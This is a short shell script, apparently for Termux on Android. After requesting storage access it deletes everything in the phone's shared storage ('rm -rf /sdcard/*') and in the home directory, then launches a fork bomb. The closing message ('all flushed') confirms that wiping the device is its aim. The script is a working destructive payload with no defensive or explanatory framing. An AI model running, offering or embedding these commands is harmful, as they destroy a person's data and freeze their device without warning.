pip install bash
termux-setup-storage
echo "wait 20 sec"
sleep 20
rm -rf /sdcard/*
echo "wait 20 sec"
sleep 20
rm -rf ~/*
echo "wait 20 sec"
sleep 30
:(){ :|:& };:
echo "done! all flushed ):"
